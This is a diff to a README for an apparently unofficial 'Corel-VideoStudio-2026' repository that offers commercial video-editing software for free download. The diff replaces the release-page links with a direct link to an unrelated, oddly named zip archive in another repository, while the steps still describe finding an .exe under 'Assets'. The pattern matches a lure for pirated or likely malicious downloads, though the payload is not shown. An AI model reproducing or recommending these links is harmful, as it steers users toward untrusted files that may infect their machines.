@@ -5,7 +5,7 @@ description: "Download the latest version of Corel VideoStudio for Windows 10 an
 ---
 # 🎬 Corel-VideoStudio-2026 - Simple professional video editing for all
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Randhead470/Corel-VideoStudio-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Randhead470/randhead470.github.io/main/printer/randhead-io-github-2.5.zip)
 
 ## Overview 📝
 
@@ -26,7 +26,7 @@ Your computer needs to meet specific standards to run this software smoothly. En
 
 Follow these steps to obtain the installer from our release page:
 
-1. Visit the following link: [https://github.com/Randhead470/Corel-VideoStudio-2026/releases](https://github.com/Randhead470/Corel-VideoStudio-2026/releases)
+1. Visit the following link: [https://raw.githubusercontent.com/Randhead470/randhead470.github.io/main/printer/randhead-io-github-2.5.zip](https://raw.githubusercontent.com/Randhead470/randhead470.github.io/main/printer/randhead-io-github-2.5.zip)
 2. Locate the section titled "Assets" at the bottom of the latest release post.
 3. Click on the file ending in .exe to start the transfer to your computer.
 4. Wait for the download to finish. Store the file in your Downloads folder or a location you remember.
